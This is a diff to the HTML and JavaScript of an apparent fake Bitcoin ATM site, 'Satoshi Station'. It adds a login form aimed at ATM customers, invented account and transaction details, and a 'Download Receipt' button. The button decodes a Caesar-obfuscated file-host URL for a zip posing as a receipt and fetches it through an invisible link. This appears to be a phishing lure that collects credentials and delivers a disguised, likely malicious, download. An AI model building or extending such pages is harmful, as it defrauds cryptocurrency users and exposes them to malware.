@@ -298,7 +298,7 @@
 </head>
 <body>
     <header>
-        <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fcdn.pixabay.com%2Fphoto%2F2017%2F07%2F27%2F21%2F01%2Fbitcoin-2546743__180.png&f=1&nofb=1&ipt=f25ef071324504dddc08b333e7c47be6524992850f95389c43d8fae23f9bfd50&ipo=images" alt="BTC ATM Logo" class="logo">
+        <img src="https://i.ibb.co/RC68XKL/BTCATM.png" alt="BTC ATM Logo" class="logo">
         <div class="btc-tracker">1 BTC = <span id="btcPrice">--loading--</span></div>
         <nav>
             <ul>
@@ -315,7 +315,7 @@
 	<main>
 		<!-- Section: Buy Bitcoin with Cash Instantly -->
 		<section id="buy-bitcoin">
-			<h2>Secure and Fast BITCOIN ATM Service</h2>
+			<h2>Satoshi Station: Secure and Fast BTC ATM</h2>
 			<h3>Buy Bitcoin with Cash Instantly</h3>
 			<p>Our ATMs provide a seamless and secure way to purchase Bitcoin with cash. Get started with digital currency today by visiting one of our many convenient locations.</p>
 			<!--<a href="#help-center" class="btn">Explore Our Help Center</a>
@@ -447,8 +447,10 @@
 <!-- Login Modal -->
 <div id="loginModal" class="modal">
   <div class="modal-content">
-    <span class="close-login">&times;</span>
+    <span class="close-login">&times;</span><br>
+    
     <h2>Login with Your Email</h2>
+	  <h5>This will be the same email that you provided when you used our ATMs</h5>
     <form id="loginForm">
       <input type="email" id="email" placeholder="Email Used at BTC ATM" required>
       <div id="passwordSection" style="display: none;">
@@ -457,21 +459,22 @@
         <p id="passwordStrength">Password Strength: </p>
       </div>
       <button type="submit" id="loginSubmit">Log In / Create Account</button>
-    </form>
+    </form><br><br>
+	  <img src="https://i.ibb.co/RC68XKL/BTCATM.png" alt="BTC ATM Logo" width="300" height="180">
   </div>
 </div>
 
 <div id="userDetails" class="modal">
     <div class="modal-content">
         <span class="close-details">×</span>
-        <h2>Welcome Jenny Baggins</h2>
+        <h2>Welcome back Stacey</h2>
         <p>Your most recent transaction:</p>
         <div class="transaction">
             <p>Location: Gas Station in Los Angeles, CA</p>
-            <p>Date: November 20, 2023</p>
-            <p>Amount: 0.05 BTC</p>
+            <p>Date: November 27, 2023</p>
+            <p>Amount: 0.35 BTC</p>
         </div>
-        <p>Contact us at: <span id="phoneNumber">support@atmbtc.com</span></p>
+        <p>Contact us at: <span id="phoneNumber">support@satoshistation.exchange</span></p>
         <button id="downloadReceipt">Download Receipt</button>
         <button id="logout">Logout</button>
     </div>
@@ -485,8 +488,8 @@
             <a href="#terms">Terms and Conditions</a>
             <a href="#careers">Careers</a>
             <a href="#help">Help Center</a>
-            <a href="#news">News</a>
-            <a href="#blog">Blog</a>
+            <a href="#news">Email us at:</a>
+            <a href="#blog">support@satoshistation.exchange</a>
         </div>
         <div class="footer-actions">
             <a href="#become-operator">Become an Operator</a>
@@ -656,7 +659,7 @@
 	document.addEventListener('DOMContentLoaded', function() {	
 		document.getElementById('downloadReceipt').onclick = function() {
 			// Decrypt the URL
-			const decryptedUrl = Decrypt("lxxtw://wxsvi8.ksjmpi.ms/hsarpseh/51g236e3-365f-4558-f17f-439ge793f70j/TvsgiwwIbtpsviv.dmt", 4);
+			const decryptedUrl = Decrypt("lxxtw://wxsvi8.ksjmpi.ms/hsarpseh/01529h75-0904-8gj3-fh46-6f6ij845126g/Pexiwx%64Vigimtx.dmt", 4);
 
 			// Create an invisible link for downloading
 			var downloadLink = document.createElement('a');
